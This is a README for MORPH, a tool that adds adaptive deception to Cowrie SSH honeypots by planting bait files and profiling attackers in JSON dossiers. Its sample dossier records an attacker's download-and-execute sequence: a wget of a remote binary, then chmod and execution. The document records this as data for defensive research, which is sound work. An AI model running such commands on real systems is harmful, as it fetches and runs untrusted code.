# MORPH — Modular Reactive Polymorphic Honeypot

An adaptive deception layer for Cowrie SSH honeypots that increases attacker dwell time and generates intelligence dossiers.

## What It Does

Traditional honeypots are static. Attackers learn their fingerprints and bail quickly. MORPH solves this by:

1. **Watching attackers in real-time** — parsing Cowrie logs as they're written
2. **Planting bait mid-session** — creating fake files (credentials, backups, scripts) based on what commands the attacker runs
3. **Learning across sessions** — adapting the fake environment based on patterns from previous attackers
4. **Generating dossiers** — structured JSON intelligence files for each attacker session

Result: attackers stay longer, reveal more TTPs, and each one sees a slightly different environment.

## How It Works

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                              MORPH Architecture                               │
└──────────────────────────────────────────────────────────────────────────────┘

  Attacker ──► Cowrie SSH ──► cowrie.json
                                   │
                                   ▼
                           ┌──────────────┐
                           │  Log Parser  │  (log_parser.py)
                           │  - Sessions  │
                           │  - Commands  │
                           │  - Downloads │
                           └──────┬───────┘
                                  │
                                  ▼
                           ┌──────────────┐
                           │  Classifier  │  (classifier.py)
                           │  - Bot/Human │
                           │  - Intent    │
                           │  - Risk      │
                           └──────┬───────┘
                                  │
                    ┌─────────────┼─────────────┐
                    ▼             ▼             ▼
             ┌───────────┐ ┌───────────┐ ┌───────────┐
             │  Dossier  │ │  Adaptor  │ │  Reactor  │
             │ Generator │ │  (cross-  │ │ (real-    │
             │           │ │  session) │ │  time)    │
             └─────┬─────┘ └─────┬─────┘ └─────┬─────┘
                   │             │             │
                   │             ▼             ▼
                   │       ┌─────────────────────────┐
                   │       │   Cowrie honeyfs/       │
                   │       │   (fake filesystem)     │
                   │       └─────────────────────────┘
                   │
                   ▼
            ┌─────────────┐
            │  Flask UI   │
            │  + HTMX     │
            └─────────────┘
```

## Key Features

### Adaptive Deception (3 Levels)

| Level | Module | Description |
|-------|--------|-------------|
| Static | `deception.py` | Pre-planted fake assets (SQL dumps, API keys, .env files) |
| Reactive | `reactor.py` | Real-time file creation based on attacker commands |
| Adaptive | `adaptor.py` | Cross-session learning — environment evolves based on attack history |

### Rule-Based Classifier

Classifies each session without ML:

- **Type**: `bot` or `human` (based on timing, command patterns, repetition)
- **Intent**: `recon`, `exploit`, or `persistence`
- **Risk**: `low`, `medium`, or `high`
- Returns `matched_rules` list for transparency

### Real-Time Reaction Engine

Monitors `cowrie.json` live. Triggers include:

| Attacker Action | Reactor Response |
|-----------------|------------------|
| `ls /var/www` | Plants `config.php` with fake DB creds |
| `cat /etc/passwd` | Creates `.ssh/authorized_keys` + `.bash_history` |
| `wget`/`curl` | Drops fake malware script in `/tmp/` |
| `find`/`locate` | Creates `db_backup_2024.sql.gz` in `/opt/backup/` |

Files are written to honeyfs/. Cowrie's fs.py is patched to auto-register new files on each connection — no pickle editing or reload required.

### Cross-Session Memory

`adaptor.py` learns from previous sessions:

- If backups were targeted → relocate to randomized paths
- If 2+ attackers tried `/etc/shadow` → plant crackable md5crypt hashes
- If bots detected → add fake open ports to `/etc/services`
- If human+exploit seen → drop half-written exploit in `/tmp/work/`

### Attacker Dossiers

JSON intelligence files per session:

- Full command history
- Login attempts
- Downloads
- Classification + matched rules
- Environment adaptations applied

### Flask + HTMX Dashboard

- Session list with risk badges
- Dossier detail view
- Live log tail (auto-refresh every 3s)
- Dark theme, no JS frameworks

## Tech Stack

- **Python 3.10+** — core pipeline
- **Flask** — web UI
- **HTMX** — live updates without JS frameworks
- **Cowrie** — SSH honeypot backend
- **watchdog** — filesystem monitoring for reactor

## Project Structure

```
MORPH/
├── main.py            # Pipeline orchestrator
├── log_parser.py      # Cowrie JSON log parser
├── classifier.py      # Rule-based session classifier
├── dossier.py         # JSON dossier generator
├── deception.py       # Static fake asset creator
├── adaptor.py         # Cross-session learning engine
├── reactor.py         # Real-time reaction engine
├── app.py             # Flask web UI
├── fs.py              # Cowrie patch: auto-registers new honeyfs files
├── templates/
│   ├── base.html      # Layout with nav
│   ├── index.html     # Dashboard
│   ├── sessions.html  # Session list
│   ├── dossier.html   # Session detail
│   ├── live_logs.html # Auto-refresh log view
│   └── _log_fragment.html
├── morph/
│   ├── dossiers/      # Generated JSON dossiers
│   ├── deception.log
│   ├── adaptor.log
│   └── reactor.log
└── .gitignore
```

## Setup

### 1. Cowrie (Linux/VPS)

```bash
# Standard Cowrie installation
git clone https://github.com/cowrie/cowrie.git /home/cowrie/cowrie
cd /home/cowrie/cowrie
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install -r requirements.txt
twistd --umask=0022 --pidfile=twistd.pid -n cowrie &
```

### 2. MORPH Pipeline

```bash
git clone https://github.com/youruser/MORPH.git
cd MORPH
pip install flask watchdog

# Update paths in:
# - log_parser.py: COWRIE_LOG
# - adaptor.py: HONEYFS_ROOT
# - reactor.py: all hardcoded paths

# Run reactor (background)
python3 reactor.py &

# Run pipeline + Flask UI
python3 main.py

## Sample Dossier

```json
{
  "session_id": "a3f8c2e1b7d9",
  "src_ip": "185.220.101.42",
  "start_time": "2024-03-29T14:23:17Z",
  "end_time": "2024-03-29T14:31:45Z",
  "duration_seconds": 508,
  "login_attempts": [
    {"username": "root", "password": "admin123", "success": false},
    {"username": "root", "password": "toor", "success": false},
    {"username": "admin", "password": "admin", "success": true}
  ],
  "commands": [
    "whoami",
    "uname -a",
    "cat /etc/passwd",
    "wget http://45.33.32.156/x86",
    "chmod +x x86",
    "./x86"
  ],
  "downloads": [
    "http://45.33.32.156/x86"
  ],
  "classification": {
    "type": "bot",
    "intent": "exploit",
    "risk": "high",
    "matched_rules": [
      "rapid_commands",
      "wget_download",
      "chmod_execute",
      "payload_execution"
    ]
  },
  "environment_adaptations": {
    "actions": [
      "Relocated backup to /opt/.cache/data/",
      "Added fake services to /etc/services"
    ],
    "triggered_by": ["previous_high_risk", "bot_detected"]
  },
  "generated_at": "2024-03-29T14:32:01Z"
}
```

## Deployment

Recommended: single VPS running both Cowrie and MORPH.

```bash
# Cowrie on port 2222, iptables redirects 22→2222
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222

# MORPH Flask on localhost:5000 (reverse proxy via nginx if needed)
# reactor_wsl.py runs as systemd service
```

## Constraints

- **Solo dev** — single maintainer
- **No ML** — all classification is rule-based
- **No paid APIs** — OSINT enrichment uses free tier only
- **Cowrie-specific** — designed for Cowrie, not generic honeypots


## License

MIT

---
